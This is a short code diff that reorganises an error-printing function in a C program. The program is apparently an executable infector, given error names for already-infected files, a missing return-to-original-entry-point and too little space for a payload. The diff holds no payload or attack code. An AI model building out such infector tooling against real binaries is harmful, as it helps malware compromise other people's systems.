@@ -14,6 +14,9 @@
 
 static void error_msg(int err)
 {
+    // Input error
+    err == ERROR_INPUT_ARGUMENTS_NUMBERS ? fprintf(stderr, RED "error" END ": %d -> ERROR_INPUT_ARGUMENTS_NUMBERS\n", err) : 0;
+
     // Lib c error
     err == ERROR_OPEN ? fprintf(stderr, RED "error" END ": %d -> ERROR_OPEN\n", err) : 0;
     err == ERROR_READ ? fprintf(stderr, RED "error" END ": %d -> ERROR_READ\n", err) : 0;
@@ -32,6 +35,9 @@ static void error_msg(int err)
     err == ERROR_FILE_IS_ALREADY_INFECTED ? fprintf(stderr, RED "error" END ": %d -> ERROR_FILE_IS_ALREADY_INFECTED\n", err) : 0;
     err == ERROR_NOT_A_REGULAR_FILE ? fprintf(stderr, RED "error" END ": %d -> ERROR_NOT_A_REGULAR_FILE\n", err) : 0;
 
+    // Infection error
+    err == ERROR_SECTION_NOT_FOUND ? fprintf(stderr, RED "error" END ": %d -> ERROR_SECTION_NOT_FOUND\n", err) : 0;
+
     // Payload error
     err == ERROR_RET2OEP_NOT_FOUND ? fprintf(stderr, RED "error" END ": %d -> ERROR_RET2OEP_NOT_FOUND\n", err) : 0;
     err == ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD ? fprintf(stderr, RED "error" END ": %d -> ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD\n", err) : 0;
@@ -43,9 +49,6 @@ static void error_msg(int err)
 
     // Functions specific error
     err == ERROR_CONCAT_STRINGS ? fprintf(stderr, RED "error" END ": %d -> ERROR_CONCAT_STRINGS\n", err) : 0;
-
-    // Others error
-    err == ERROR_INPUT_ARGUMENTS_NUMBERS ? fprintf(stderr, RED "error" END ": %d -> ERROR_INPUT_ARGUMENTS_NUMBERS\n", err) : 0;
 
     if (errno != 0)
     {
